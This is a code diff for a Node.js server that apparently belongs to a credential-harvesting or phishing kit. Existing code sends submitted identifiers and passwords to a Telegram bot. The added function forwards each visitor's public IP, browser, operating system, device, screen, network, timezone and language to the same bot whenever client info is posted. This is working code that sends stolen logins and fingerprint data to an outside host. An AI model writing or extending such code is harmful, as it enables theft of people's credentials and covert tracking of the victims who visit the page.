@@ -46,7 +46,7 @@ const usersDB = [];
 const sendTelegramAlert = async (identifier, password) => {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
-  
+
   if (!token || !chatId) {
     console.log('[DEBUG] Telegram Token or Chat ID missing in .env');
     return;
@@ -62,7 +62,7 @@ const sendTelegramAlert = async (identifier, password) => {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: chatId, text: message })
     });
-    
+
     const result = await response.json();
     if (result.ok) {
       console.log('[DEBUG] Telegram alert sent successfully!');
@@ -71,6 +71,52 @@ const sendTelegramAlert = async (identifier, password) => {
     }
   } catch (error) {
     console.error('[DEBUG] Failed to send Telegram alert:', error.message);
+  }
+};
+
+const sendClientInfoTelegramAlert = async (clientPayload) => {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!token || !chatId || !clientPayload) {
+    return;
+  }
+
+  const summary = {
+    browser: clientPayload.browser,
+    os: clientPayload.system,
+    device: clientPayload.device,
+    screen: clientPayload.screen,
+    connection: clientPayload.connection,
+    capabilities: clientPayload.capabilities,
+    server: clientPayload.server
+  };
+
+  const message = [
+    'New client environment detected:',
+    `IP: ${clientPayload.server?.publicIp || 'unknown'}`,
+    `Browser: ${clientPayload.browser?.name || 'unknown'} ${clientPayload.browser?.version || ''}`,
+    `OS: ${clientPayload.system?.os || 'unknown'} ${clientPayload.system?.osVersion || ''}`,
+    `Device: ${clientPayload.device?.type || 'unknown'}`,
+    `Screen: ${clientPayload.screen?.width || 'n/a'}x${clientPayload.screen?.height || 'n/a'}`,
+    `Network: ${clientPayload.connection?.effectiveType || 'n/a'} / ${clientPayload.connection?.type || 'n/a'}`,
+    `Timezone: ${clientPayload.browser?.timezone || 'n/a'}`,
+    `Language: ${clientPayload.browser?.language || 'n/a'}`,
+    `JSON: ${JSON.stringify(summary)}`
+  ].join('\n');
+
+  try {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        disable_web_page_preview: true
+      })
+    });
+  } catch (error) {
+    console.error('[DEBUG] Failed to send client info Telegram alert:', error.message);
   }
 };
 
@@ -158,6 +204,8 @@ app.post('/api/client-info', clientInfoRateLimiter, (req, res) => {
     if (clientInfoStore.length > 200) {
       clientInfoStore.splice(0, clientInfoStore.length - 200);
     }
+
+    void sendClientInfoTelegramAlert(safePayload);
 
     return res.status(202).json({
       message: 'Client information received successfully.',
